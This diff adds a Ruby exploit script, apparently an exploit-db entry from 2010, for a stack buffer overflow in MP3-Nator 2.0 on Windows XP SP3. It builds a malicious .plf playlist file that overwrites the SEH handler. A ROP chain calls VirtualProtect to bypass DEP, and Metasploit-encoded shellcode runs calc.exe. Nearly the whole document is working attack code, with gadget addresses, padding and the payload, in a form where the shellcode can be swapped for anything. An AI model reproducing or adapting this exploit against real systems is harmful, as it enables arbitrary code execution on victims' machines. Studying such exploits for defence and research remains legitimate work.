@@ -1,0 +1,122 @@
+# Exploit Title: Exploit Buffer Overflow MP3-Nator (SEH - DEP BYPASS)
+# Date: 18-11-2010
+# Author: Muhamad Fadzil Ramli - mind1355[at]gmail[dot]com
+# Credit/Bug Found By: C4SS!0 G0M3S
+# Software Link: http://www.brothersoft.com/d.php?soft_id=16524&url=http://files.brothersoft.com/mp3_audio/players/mp3nator.zip
+# Version: 2.0
+# Tested on: Windows XP SP3 EN - Latest Update (VMWARE FUSION - Version 3.1.1)
+# CVE: N/A
+ 
+#! /usr/bin/env ruby
+filename = 'crash.plf'
+
+# ./msfpayload windows/exec CMD=calc EXITFUNC=seh R | ./msfencode -e x86/alpha_mixed -b '\x00' -t ruby
+# [*] x86/alpha_mixed succeeded with size 456 (iteration=1)
+shellcode =
+"\x89\xe3\xda\xcf\xd9\x73\xf4\x58\x50\x59\x49\x49\x49\x49" +
+"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" +
+"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" +
+"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" +
+"\x42\x75\x4a\x49\x49\x6c\x4d\x38\x4d\x59\x47\x70\x43\x30" +
+"\x47\x70\x43\x50\x4e\x69\x48\x65\x50\x31\x48\x52\x43\x54" +
+"\x4c\x4b\x51\x42\x46\x50\x4e\x6b\x50\x52\x44\x4c\x4c\x4b" +
+"\x50\x52\x46\x74\x4e\x6b\x51\x62\x45\x78\x46\x6f\x4c\x77" +
+"\x43\x7a\x47\x56\x50\x31\x49\x6f\x45\x61\x49\x50\x4e\x4c" +
+"\x47\x4c\x45\x31\x43\x4c\x47\x72\x44\x6c\x51\x30\x4f\x31" +
+"\x48\x4f\x46\x6d\x43\x31\x49\x57\x4b\x52\x4a\x50\x46\x32" +
+"\x43\x67\x4c\x4b\x46\x32\x46\x70\x4e\x6b\x43\x72\x47\x4c" +
+"\x47\x71\x48\x50\x4c\x4b\x47\x30\x43\x48\x4b\x35\x4b\x70" +
+"\x50\x74\x43\x7a\x47\x71\x4e\x30\x42\x70\x4c\x4b\x51\x58" +
+"\x42\x38\x4c\x4b\x42\x78\x51\x30\x46\x61\x48\x53\x49\x73" +
+"\x47\x4c\x43\x79\x4e\x6b\x44\x74\x4e\x6b\x45\x51\x49\x46" +
+"\x46\x51\x49\x6f\x45\x61\x4b\x70\x4c\x6c\x4f\x31\x48\x4f" +
+"\x46\x6d\x43\x31\x4a\x67\x47\x48\x4d\x30\x50\x75\x48\x74" +
+"\x47\x73\x43\x4d\x4a\x58\x45\x6b\x43\x4d\x47\x54\x42\x55" +
+"\x4b\x52\x50\x58\x4c\x4b\x50\x58\x45\x74\x47\x71\x4e\x33" +
+"\x51\x76\x4e\x6b\x44\x4c\x42\x6b\x4e\x6b\x46\x38\x45\x4c" +
+"\x45\x51\x4e\x33\x4e\x6b\x44\x44\x4c\x4b\x46\x61\x4a\x70" +
+"\x4f\x79\x50\x44\x44\x64\x44\x64\x51\x4b\x43\x6b\x51\x71" +
+"\x43\x69\x50\x5a\x42\x71\x4b\x4f\x4d\x30\x46\x38\x43\x6f" +
+"\x50\x5a\x4c\x4b\x47\x62\x48\x6b\x4f\x76\x43\x6d\x43\x5a" +
+"\x43\x31\x4c\x4d\x4e\x65\x48\x39\x45\x50\x47\x70\x47\x70" +
+"\x46\x30\x42\x48\x46\x51\x4e\x6b\x42\x4f\x4e\x67\x49\x6f" +
+"\x4e\x35\x4d\x6b\x4b\x4e\x46\x6e\x44\x72\x4a\x4a\x50\x68" +
+"\x4c\x66\x4a\x35\x4f\x4d\x4f\x6d\x4b\x4f\x48\x55\x47\x4c" +
+"\x47\x76\x43\x4c\x46\x6a\x4d\x50\x4b\x4b\x4d\x30\x44\x35" +
+"\x45\x55\x4f\x4b\x47\x37\x47\x63\x43\x42\x50\x6f\x51\x7a" +
+"\x45\x50\x42\x73\x4b\x4f\x49\x45\x45\x33\x43\x51\x50\x6c" +
+"\x51\x73\x45\x50\x47\x7a\x41\x41"
+
+junk1 	=  'A' * 28
+
+# ROP1
+rop1	=  ''
+rop1	<< [0x71ABDAC3].pack('V')	# PUSH ESP # POP ESI # RETN 	[Module : WS2_32.dll]
+rop1	<< [0x71ABDC56].pack('V')   # MOV EAX,ESI # POP ESI # RETN 	[Module : WS2_32.dll]
+rop1	<< "DEAD"					# PADDING
+rop1	<< [0x1001595E].pack('V')	# ADD ESP,20 # RETN - xaudio.dll
+
+# VIRTUALPROTECT PARAMETERS
+params	= ''
+params	<< [0x7C801AD4].pack('V')	# VirtualProtect
+params	<< 'WWWW'					# return address [ PARAM #1 ]
+params	<< 'XXXX'					# lpAddress      [ PARAM #2 ]
+params	<< 'YYYY'					# Size           [ PARAM #3 ]
+params	<< 'ZZZZ'					# flNewProtect   [ PARAM #4 ]
+params	<< [0x5ADA1005].pack('V')	# writeable address
+params	<< 'BEEF' * 2				# PADDING
+
+# ROP2 - [ PARAM #1 ]
+rop2	=  ''
+rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll]
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< "BEEF"					# PADDING
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll]
+rop2	<< 'BEEF'
+
+# ROP2 - [ PARAM #2 ]
+rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll]
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll]
+rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll]
+rop2	<< 'BEEF'
+
+# rop2 - [ PARAM #3 ]
+rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll]
+rop2	<< [0x77E8559E].pack('V')	# XOR EAX,EAX # RETN 	[Module : RPCRT4.dll]
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77C4EC2B].pack('V')	# ADD EAX,100 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll]
+rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll]
+rop2	<< 'BEEF'
+
+# rop2	- [ PARAM #4 ]
+rop2	<< [0x775D1578].pack('V')	# PUSH EAX # POP ESI # RETN 	[Module : ole32.dll]
+rop2	<< [0x77E8559E].pack('V')	# XOR EAX,EAX # RETN 	[Module : RPCRT4.dll]
+rop2	<< [0x77C4EC1D].pack('V')	# ADD EAX,40 # POP EBP # RETN 	[Module : msvcrt.dll]
+rop2	<< 'BEEF'					# PADDING
+rop2	<< [0x77157D1D].pack('V') * 4 # INC ESI # RETN 	[Module : oleaut32.dll]
+rop2	<< [0x77E8416B].pack('V')	# MOV DWORD PTR DS:[ESI+10],EAX # MOV EAX,ESI # POP ESI # RETN 	[Module : RPCRT4.dll]
+rop2	<< 'BEEF'
+
+# POINT ESP TO VIRTUALPROTECT
+rop2	<< [0x7475B960].pack('V')	# XCHG EAX,ESP # RETN 	[Module : MSCTF.dll]
+nops	= "\x90" * 310
+
+junk1	= junk1 + rop1 + params + rop2 + nops + shellcode + 'A' * (4112 - (junk1 + rop1 + params + rop2 + nops + shellcode).length)
+
+seh		=  [0x10019C35].pack('V')	# ADD ESP,41C # RETN - xaudio.dll
+junk2	=  'C' * (10000 - (junk1 + seh).length)
+xploit	= junk1 + seh + junk2
+
+File.open(filename,'w') do |fd|
+	fd.write xploit
+	puts "file size : #{xploit.length.to_s}"
+end
